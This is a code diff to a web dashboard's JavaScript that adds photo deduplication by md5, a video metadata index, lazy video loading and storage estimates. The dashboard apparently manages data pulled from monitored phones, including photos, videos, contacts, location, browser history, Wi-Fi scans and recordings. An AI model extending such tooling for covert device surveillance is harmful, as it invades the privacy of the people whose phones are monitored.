@@ -333,6 +333,7 @@ canvas.chart-canvas{width:100%!important;height:200px!important;border-radius:6p
 <span class="chip" style="background:var(--accent);color:#000;font-size:13px;cursor:pointer" onclick="refreshPhotos()">&#x1F504; Refresh</span>
 </div>
 </div>
+<div id="photoDedupHint" style="display:none;font-size:12px;color:var(--warning);background:var(--card);border:1px solid var(--warning);padding:8px 10px;border-radius:var(--radius);margin-bottom:8px"></div>
 <div id="photoGrid" class="photo-grid"><div class="label" style="margin:20px 0">&#x1F4F8; Click the Photos tab to load</div></div>
 <div id="loadMoreContainer"></div>
 </div>
@@ -781,6 +782,8 @@ const VIDEO_BATCH = 24;
 let videoLoading = false;
 let videoSourceFilter = 'all';
 let cachedVideos = {};
+let videoMeta = {};
+let videoMetaPresent = false;
 let selectedVideoKeys = new Set();
 let videoRendered = new Set();
 let videoState = { deviceId: null };
@@ -1283,11 +1286,36 @@ function clearVideoCache() {
   selectedVideoKeys.clear();
   videoRendered.clear();
   videoState.deviceId = null;
+  videoMeta = {};
+  videoMetaPresent = false;
   updateVideoSelectionUI();
 }
 
 function videoLastCachedKey() {
   return videoKeys.length ? videoKeys[0] : null;
+}
+
+function videoDateMs(v) {
+  if (typeof v.ts_ms === 'number' && v.ts_ms > 100000000000) return v.ts_ms;
+  if (typeof v.dateAdded === 'number') {
+    if (v.dateAdded > 100000000000) return v.dateAdded;
+    if (v.dateAdded > 1000000000) return v.dateAdded * 1000;
+  }
+  return Date.now();
+}
+
+async function syncVideoMeta() {
+  if (!selectedDevice) return null;
+  const lastKey = Object.keys(videoMeta).sort().pop() || null;
+  const enc = lastKey ? encodeURIComponent(JSON.stringify(lastKey)) : null;
+  const q = enc ? `orderBy=%22%24key%22&startAt=${enc}&limitToLast=300` : `orderBy=%22%24key%22&limitToLast=300`;
+  const idx = await fetchRTDB(`devices/${selectedDevice}/videos/_index`, q);
+  if (!idx || typeof idx !== 'object') return null;
+  for (const k of Object.keys(idx)) {
+    const v = idx[k];
+    if (v && typeof v === 'object') videoMeta[k] = v;
+  }
+  return Object.keys(videoMeta).sort((a, b) => parseInt(b, 10) - parseInt(a, 10));
 }
 
 function updateVideoCount() {
@@ -1302,16 +1330,30 @@ async function pollVideos() {
   if (videoLoading) return;
   videoLoading = true;
   try {
-    const lastKey = videoLastCachedKey();
-    const enc = lastKey ? encodeURIComponent(JSON.stringify(lastKey)) : null;
-    const q = enc ? `orderBy=%22%24key%22&startAt=${enc}&limitToLast=300` : `orderBy=%22%24key%22&limitToLast=300`;
-    const keysData = await fetchRTDB(`devices/${selectedDevice}/videos`, q);
-    if (!keysData || typeof keysData !== 'object') {
+    const metaKeys = await syncVideoMeta();
+    videoMetaPresent = !!(metaKeys && metaKeys.length);
+    const keysData = await fetchRTDB(`devices/${selectedDevice}/videos`, 'shallow=true');
+    const allKeys = (keysData && typeof keysData === 'object')
+      ? Object.keys(keysData).filter(k => k !== '_index')
+      : [];
+    if (videoMetaPresent) {
+      const merged = new Set([...allKeys, ...videoKeys]);
+      videoKeys = [...merged].sort((a, b) => parseInt(b, 10) - parseInt(a, 10));
+      for (const k of videoKeys) if (!cachedVideos[k] && videoMeta[k]) cachedVideos[k] = videoMeta[k];
+      videoOffset = 0;
+      updateVideoCount();
+      const renderNow = videoKeys.filter(k => cachedVideos[k] && !videoRendered.has(k) && (videoSourceFilter === 'all' || cachedVideos[k].source === videoSourceFilter));
+      if (renderNow.length) renderVideoGroup(renderNow);
+      renderVideos();
+      await loadMoreVideos(true);
+      trimVideoCache();
+      return;
+    }
+    if (!allKeys.length) {
       if (!Object.keys(cachedVideos).length) { videoKeys = []; renderVideos(); }
       return;
     }
-    const freshKeys = Object.keys(keysData).sort((a, b) => parseInt(b, 10) - parseInt(a, 10));
-    const merged = new Set([...freshKeys, ...videoKeys]);
+    const merged = new Set([...allKeys, ...videoKeys]);
     videoKeys = [...merged].sort((a, b) => parseInt(b, 10) - parseInt(a, 10));
     videoOffset = 0;
     updateVideoCount();
@@ -1329,10 +1371,23 @@ async function refreshVideos() {
 async function loadAllVideos() {
   if (!selectedDevice) return;
   if (!videoKeys.length) await pollVideos();
+  if (videoMetaPresent) return; // index path already loads all (lightweight)
   videoLoading = false;
   while (videoOffset < videoKeys.length) {
     await loadMoreVideos(true);
     await new Promise(r => setTimeout(r, 10));
+  }
+}
+
+function trimVideoCache() {
+  const keys = Object.keys(cachedVideos).sort((a, b) => parseInt(b, 10) - parseInt(a, 10));
+  if (keys.length > 300) {
+    const toDrop = keys.slice(300);
+    toDrop.forEach(k => {
+      if (cachedVideos[k] && cachedVideos[k]._blobUrl) { try { URL.revokeObjectURL(cachedVideos[k]._blobUrl); } catch {} }
+      delete cachedVideos[k];
+      videoRendered.delete(k);
+    });
   }
 }
 
@@ -1364,16 +1419,7 @@ async function loadMoreVideos(skipGuard = false) {
   const newRendered = batch.filter(k => cachedVideos[k] && !videoRendered.has(k) && (videoSourceFilter === 'all' || cachedVideos[k].source === videoSourceFilter));
   if (newRendered.length) renderVideoGroup(newRendered);
   renderVideos();
-
-  const keys = Object.keys(cachedVideos).sort((a, b) => parseInt(b, 10) - parseInt(a, 10));
-  if (keys.length > 300) {
-    const toDrop = keys.slice(300);
-    toDrop.forEach(k => {
-      if (cachedVideos[k] && cachedVideos[k]._blobUrl) { try { URL.revokeObjectURL(cachedVideos[k]._blobUrl); } catch {} }
-      delete cachedVideos[k];
-      videoRendered.delete(k);
-    });
-  }
+  trimVideoCache();
 
   const container = document.getElementById('videoLoadMoreContainer');
   container.innerHTML = '';
@@ -1391,9 +1437,9 @@ function renderVideoGroup(keys) {
   const videos = cachedVideos;
   for (const k of keys) {
     const v = videos[k];
-    if (!v || (!v.storageUrl && !v.data)) { videoRendered.add(k); continue; }
+    if (!v || (!v.storageUrl && !v.data && !v.thumb)) { videoRendered.add(k); continue; }
     videoRendered.add(k);
-    const date = v.dateAdded ? new Date(v.dateAdded) : new Date(v.ts_ms);
+    const date = new Date(videoDateMs(v));
     const dateStr = date.toLocaleDateString('en-GB', { day: '2-digit', month: 'short', year: 'numeric' });
     const timeStr = date.toLocaleTimeString('en-GB', { hour: '2-digit', minute: '2-digit' });
     const existingHeaders = grid.querySelectorAll('.photo-day-header');
@@ -1419,7 +1465,7 @@ function renderVideoGroup(keys) {
     img.loading = 'lazy';
     img.src = thumb;
     img.alt = v.fileName || 'Video';
-    img.onclick = (ev) => { if (ev.target.closest('.video-select') || ev.target.closest('[data-delvideo]')) return; openVideoPlayer(v.storageUrl || v.data, v); };
+    img.onclick = (ev) => { if (ev.target.closest('.video-select') || ev.target.closest('[data-delvideo]')) return; openVideoPlayer(k, v); };
     wrap.appendChild(img);
     const sel = document.createElement('div');
     sel.className = 'video-select';
@@ -1571,12 +1617,25 @@ async function deleteSelectedVideos() {
   showAlert('Deleted ' + deleted + ' videos' + (failed ? ', failed ' + failed : ''), deleted > 0 ? 'warn' : 'error');
 }
 
-function openVideoPlayer(src, meta) {
+async function openVideoPlayer(k, meta) {
   const overlay = document.getElementById('videoPlayerOverlay');
   const player = document.getElementById('videoPlayer');
   const metaEl = document.getElementById('videoPlayerMeta');
   if (!overlay || !player) return;
-  if (src && !src.startsWith('http') && !src.startsWith('data:')) {
+  if (!meta.storageUrl && !meta.data) {
+    // index entry has no data - fetch the full video doc lazily
+    try {
+      const full = await fetchRTDB(`devices/${selectedDevice}/videos/${k}`);
+      if (full && typeof full === 'object' && (full.storageUrl || full.data)) {
+        full._key = k;
+        Object.assign(meta, full);
+        cachedVideos[k] = full;
+      }
+    } catch {}
+  }
+  let src = meta.storageUrl || meta.data;
+  if (!src) { showAlert('Video data not available', 'error'); return; }
+  if (!src.startsWith('http') && !src.startsWith('data:')) {
     if (!meta._blobUrl) meta._blobUrl = base64ToBlobUrl(src, 'video/mp4');
     if (meta._blobUrl) src = meta._blobUrl;
     else src = 'data:video/mp4;base64,' + src;
@@ -1878,7 +1937,7 @@ async function pollMeta() {
   }
 }
 
-// --- Photos (Lazy Load, incremental) ---
+// --- Photos (Lazy Load, incremental, unique-by-index) ---
 let photoKeys = [];
 let photoOffset = 0;
 const PHOTO_BATCH = 24;
@@ -1887,9 +1946,13 @@ let photoDateKeys = {};
 let photoDateWatermarks = {};
 let photoAllPaths = [];
 let photoState = { deviceId: null };
+let photoUnique = {};        // md5 -> {ts, fileName} from photos/_index/md5
+let photoIndexPresent = false;
 
 function clearPhotoCache() {
   cachedPhotos = {};
+  photoUnique = {};
+  photoIndexPresent = false;
   photoDateKeys = {};
   photoDateWatermarks = {};
   photoAllPaths = [];
@@ -1919,6 +1982,21 @@ function mergePhotoDateKeys(date, tsKeys) {
   rebuildPhotoAllPaths();
 }
 
+async function syncPhotoUnique() {
+  if (!selectedDevice) return;
+  const lastMd5 = Object.keys(photoUnique).sort().pop() || null;
+  const enc = lastMd5 ? encodeURIComponent(JSON.stringify(lastMd5)) : null;
+  const q = enc ? `orderBy=%22%24key%22&startAt=${enc}&limitToLast=500` : `orderBy=%22%24key%22&limitToLast=500`;
+  const idx = await fetchRTDB(`devices/${selectedDevice}/photos/_index/md5`, q);
+  photoIndexPresent = !!(idx && typeof idx === 'object');
+  if (photoIndexPresent) {
+    for (const md5 of Object.keys(idx)) {
+      const v = idx[md5];
+      if (v && typeof v === 'object' && v.ts) photoUnique[md5] = { ts: v.ts, fileName: v.fileName || '' };
+    }
+  }
+}
+
 async function syncPhotoIndex() {
   if (!selectedDevice) return;
   const datesData = await fetchRTDB(`devices/${selectedDevice}/photos`, 'shallow=true');
@@ -1946,42 +2024,71 @@ async function syncPhotoIndex() {
   rebuildPhotoAllPaths();
 }
 
+function photoTsToDate() {
+  const map = {};
+  for (const date of Object.keys(photoDateKeys)) {
+    for (const t of photoDateKeys[date]) map[String(t)] = date;
+  }
+  return map;
+}
+
+async function fetchUniquePhotoBodies() {
+  if (!selectedDevice || !Object.keys(photoUnique).length) return;
+  const tsToDate = photoTsToDate();
+  for (const md5 of Object.keys(photoUnique)) {
+    if (cachedPhotos[md5]) continue;
+    const ts = String(photoUnique[md5].ts);
+    const date = tsToDate[ts];
+    if (!date) continue;
+    try {
+      const doc = await fetchRTDB(`devices/${selectedDevice}/photos/${date}/${ts}`);
+      if (doc && doc.data && doc.data.startsWith('/9j/')) {
+        doc.key = date + '/' + ts;
+        doc._md5 = md5;
+        doc._date = date;
+        doc._ts = ts;
+        cachedPhotos[md5] = doc;
+      }
+    } catch {}
+  }
+}
+
 async function fetchPhotoBatch() {
   if (!selectedDevice || !photoAllPaths.length || photoLoading) return;
   photoLoading = true;
   const batch = photoAllPaths.slice(photoOffset, photoOffset + PHOTO_BATCH);
   for (const path of batch) {
-    if (cachedPhotos[path]) continue;
     const slash = path.indexOf('/');
     const date = path.slice(0, slash), ts = path.slice(slash + 1);
     try {
       const doc = await fetchRTDB(`devices/${selectedDevice}/photos/${date}/${ts}`);
       if (doc && doc.data && doc.data.startsWith('/9j/')) {
-        doc.key = path;
+        const md5 = doc.md5 || ((doc.fileName || '') + '|' + (doc.dateTaken || ''));
+        doc.key = date + '/' + ts;
+        doc._md5 = md5;
         doc._date = date;
         doc._ts = ts;
-        cachedPhotos[path] = doc;
+        if (!cachedPhotos[md5]) cachedPhotos[md5] = doc;
       }
     } catch {}
     if (Object.keys(cachedPhotos).length >= 500) break;
   }
   photoOffset += batch.length;
   photoLoading = false;
-  const entries = Object.keys(cachedPhotos);
-  if (entries.length > 500) {
-    entries.sort((a, b) => parseInt(b.split('/')[1], 10) - parseInt(a.split('/')[1], 10));
-    const toDrop = entries.slice(500);
-    toDrop.forEach(k => delete cachedPhotos[k]);
-  }
 }
 
 async function pollPhotos() {
   if (!selectedDevice) return;
   if (photoState.deviceId !== selectedDevice) clearPhotoCache();
   photoState.deviceId = selectedDevice;
+  await syncPhotoUnique();
   await syncPhotoIndex();
-  photoOffset = 0;
-  await fetchPhotoBatch();
+  if (photoIndexPresent && Object.keys(photoUnique).length) {
+    await fetchUniquePhotoBodies();
+  } else if (photoAllPaths.length) {
+    photoOffset = 0;
+    await fetchPhotoBatch();
+  }
   renderPhotosFromCache();
 }
 
@@ -2036,29 +2143,33 @@ function renderPhotosFromCache() {
     return true;
   });
   if (!docs.length) {
-    const total = photoAllPaths.length;
+    const total = photoIndexPresent && Object.keys(photoUnique).length ? Object.keys(photoUnique).length : photoAllPaths.length;
     grid.innerHTML = '<div class="label" style="margin:20px 0">&#x1F4F8; ' + (Object.keys(cachedPhotos).length ? 'No photos match the search' : (total ? 'Loading photos\u2026' : 'No photos yet')) + '</div>';
-    if (countEl) countEl.innerHTML = total ? '&middot; ' + total + ' total' : '';
+    if (countEl) countEl.innerHTML = total ? '&middot; ' + total + ' unique photo' + (total > 1 ? 's' : '') : '';
     if (lmContainer) lmContainer.innerHTML = '';
     updatePhotoSelectionUI();
     return;
   }
 
-  // Dedup by md5 (or fileName|dateTaken) keeping highest quality
-  const dedup = {};
-  for (const doc of docs) {
-    const key = doc.md5 || ((doc.fileName || '') + '|' + (doc.dateTaken || ''));
-    const existing = dedup[key];
-    if (!existing || (doc.data.length > existing.data.length)) dedup[key] = doc;
+  const totalUnique = photoIndexPresent && Object.keys(photoUnique).length ? Object.keys(photoUnique).length : photoAllPaths.length;
+  if (countEl) {
+    const loaded = docs.length;
+    countEl.innerHTML = '&middot; ' + loaded + ' unique' + (totalUnique > loaded ? '/' + totalUnique : '') + ' photo' + (loaded > 1 ? 's' : '');
   }
-  const dedupDocs = Object.values(dedup);
+  // Dedup hint: many raw entries but few unique -> duplicates exist in RTDB
+  const dupHint = document.getElementById('photoDedupHint');
+  if (dupHint) {
+    if (photoAllPaths.length > totalUnique && totalUnique > 0) {
+      dupHint.style.display = 'block';
+      dupHint.innerHTML = '&#x26A0;&#xFE0F; ' + photoAllPaths.length + ' raw entries but only <b>' + totalUnique + '</b> unique photo' + (totalUnique > 1 ? 's' : '') + ' (duplicates). Run <span style="color:var(--accent);cursor:pointer;text-decoration:underline" onclick="execCleanup(\'dedupPhotos\',\'photos\')">Dedup Photos</span> in Storage to clean up.';
+    } else {
+      dupHint.style.display = 'none';
+    }
+  }
 
-  const totalStr = photoAllPaths.length ? ' &middot; ' + photoAllPaths.length + ' total' : '';
-  if (countEl) countEl.innerHTML = '&middot; ' + dedupDocs.length + ' loaded' + totalStr;
-
-  // Group by date bucket
+  // Group by date bucket (docs are already unique - cachedPhotos keyed by md5)
   const groups = {};
-  for (const doc of dedupDocs) {
+  for (const doc of docs) {
     const ts = doc.dateTaken || doc.timestamp || 0;
     const bucket = dateBucket(ts);
     if (!groups[bucket]) groups[bucket] = [];
@@ -2091,12 +2202,12 @@ function renderPhotosFromCache() {
 
   grid.innerHTML = html || '<div class="label" style="margin:20px 0">&#x1F4F8; No photos matched</div>';
 
-  // Load more button
-  if (photoOffset < photoAllPaths.length) {
+  // Load more button (fallback raw paging only - the index path loads all unique at once)
+  if (!photoIndexPresent && photoOffset < photoAllPaths.length) {
     const remaining = photoAllPaths.length - photoOffset;
     lmContainer.innerHTML = '<div class="load-more-btn" onclick="loadMorePhotos()">&#x2B07; Load ' + Math.min(PHOTO_BATCH, remaining) + ' more (' + remaining + ' remaining)</div>';
   } else {
-    lmContainer.innerHTML = dedupDocs.length > 0 ? '<div style="text-align:center;font-size:13px;color:var(--muted);margin-top:6px">&#x2714; All photos loaded (' + dedupDocs.length + ')</div>' : '';
+    lmContainer.innerHTML = docs.length > 0 ? '<div style="text-align:center;font-size:13px;color:var(--muted);margin-top:6px">&#x2714; All unique photos shown (' + docs.length + ')</div>' : '';
   }
   updatePhotoSelectionUI();
 }
@@ -2134,10 +2245,14 @@ document.getElementById('btnSelectAllPhotos')?.addEventListener('click', functio
   renderPhotosFromCache();
 });
 
-async function deletePhotoRTDB(date, ts) {
+async function deletePhotoRTDB(date, ts, md5) {
   try {
     const ok = await deleteRTDB(`devices/${selectedDevice}/photos/${date}/${ts}`);
     if (!ok) return false;
+    if (md5) {
+      await deleteRTDB(`devices/${selectedDevice}/photos/_index/md5/${md5}`);
+      delete photoUnique[md5];
+    }
     const sub = await fetchRTDB(`devices/${selectedDevice}/photos/${date}`, 'shallow=true');
     if (!sub || typeof sub !== 'object' || !Object.keys(sub).length) {
       return await deleteRTDB(`devices/${selectedDevice}/photos/${date}`);
@@ -2151,14 +2266,17 @@ async function deleteSelectedPhotos() {
   if (!confirm('Delete ' + selectedPhotoKeys.size + ' selected photos from RTDB?\nThis cannot be undone.')) return;
   let deleted = 0, failed = 0;
   for (const key of [...selectedPhotoKeys]) {
+    const doc = Object.values(cachedPhotos).find(d => d && d.key === key);
+    const md5 = doc && doc._md5;
     const slash = key.indexOf('/');
     const date = key.slice(0, slash), ts = key.slice(slash + 1);
-    if (await deletePhotoRTDB(date, ts)) {
+    if (await deletePhotoRTDB(date, ts, md5)) {
       deleted++;
-      delete cachedPhotos[key];
+      if (md5) delete cachedPhotos[md5];
     } else failed++;
   }
   selectedPhotoKeys.clear();
+  await syncPhotoUnique();
   await syncPhotoIndex();
   renderPhotosFromCache();
   updatePhotoSelectionUI();
@@ -4219,6 +4337,65 @@ async function deleteRTDB(path) {
   } catch { return false; }
 }
 
+async function estimatePhotos() {
+  const devicePath = `devices/${selectedDevice}`;
+  const idx = await fetchRTDB(`${devicePath}/photos/_index/md5`, 'shallow=true');
+  let count = idx && typeof idx === 'object' ? Object.keys(idx).length : 0;
+  const dates = await fetchRTDB(`${devicePath}/photos`, 'shallow=true');
+  let tsToDate = {};
+  if (dates && typeof dates === 'object') {
+    for (const d of Object.keys(dates)) {
+      if (d.startsWith('_')) continue;
+      const sub = await fetchRTDB(`${devicePath}/photos/${d}`, 'shallow=true');
+      if (sub && typeof sub === 'object') for (const t of Object.keys(sub)) tsToDate[String(t)] = d;
+    }
+  }
+  if (!count && tsToDate) count = Object.keys(tsToDate).length;
+  let bytes = 0, sampled = 0;
+  if (count && idx && typeof idx === 'object') {
+    for (const md5 of Object.keys(idx).slice(0, 3)) {
+      const v = await fetchRTDB(`${devicePath}/photos/_index/md5/${md5}`);
+      if (v && v.ts && tsToDate[String(v.ts)]) {
+        try {
+          const r = await fetch(`${RTDB}/${devicePath}/photos/${tsToDate[String(v.ts)]}/${v.ts}.json`);
+          if (r.ok) { const t = await r.text(); bytes += new Blob([t]).size; sampled++; }
+        } catch {}
+      }
+    }
+  }
+  const avg = sampled ? bytes / sampled : 0;
+  return { count, bytes: Math.round(count * avg) };
+}
+
+async function estimateVideos() {
+  const devicePath = `devices/${selectedDevice}`;
+  const idx = await fetchRTDB(`${devicePath}/videos/_index`, 'shallow=true');
+  if (idx && typeof idx === 'object') {
+    const keys = Object.keys(idx);
+    let bytes = 0, sampled = 0;
+    for (const k of keys.slice(0, 3)) {
+      try {
+        const r = await fetch(`${RTDB}/${devicePath}/videos/_index/${k}.json`);
+        if (r.ok) { const t = await r.text(); bytes += new Blob([t]).size; sampled++; }
+      } catch {}
+    }
+    const avg = sampled ? bytes / sampled : 0;
+    return { count: keys.length, bytes: Math.round(keys.length * avg) };
+  }
+  const raw = await fetchRTDB(`${devicePath}/videos`, 'shallow=true');
+  if (!raw || typeof raw !== 'object') return { count: 0, bytes: 0 };
+  const keys = Object.keys(raw).filter(k => k !== '_index');
+  let bytes = 0, sampled = 0;
+  for (const k of keys.slice(0, 2)) {
+    try {
+      const r = await fetch(`${RTDB}/${devicePath}/videos/${k}.json`);
+      if (r.ok) { const t = await r.text(); bytes += new Blob([t]).size; sampled++; }
+    } catch {}
+  }
+  const avg = sampled ? bytes / sampled : 0;
+  return { count: keys.length, bytes: Math.round(keys.length * avg) };
+}
+
 async function estimateNodeSize(path, sampleSize = 3) {
   const keys = await fetchRTDB(path, 'shallow=true');
   if (!keys || typeof keys !== 'object') return { count: 0, bytes: 0 };
@@ -4249,7 +4426,7 @@ async function refreshStorage() {
   const devicePath = `devices/${selectedDevice}`;
   try {
     const [photos, voice, timeline, contacts, apps, location, browser, wifi, videos, recordings] = await Promise.all([
-      estimateNodeSize(`${devicePath}/photos`, 3),
+      estimatePhotos(),
       estimateNodeSize(`${devicePath}/voice_notes`, 2),
       estimateNodeSize(`${devicePath}/timeline`, 1),
       estimateNodeSize(`${devicePath}/contacts`, 1),
@@ -4257,7 +4434,7 @@ async function refreshStorage() {
       estimateNodeSize(`${devicePath}/location`, 1),
       estimateNodeSize(`${devicePath}/browser_history`, 1),
       estimateNodeSize(`${devicePath}/wifi_scan`, 1),
-      estimateNodeSize(`${devicePath}/videos`, 2),
+      estimateVideos(),
       estimateNodeSize(`${devicePath}/recordings`, 2)
     ]);
     const categories = [
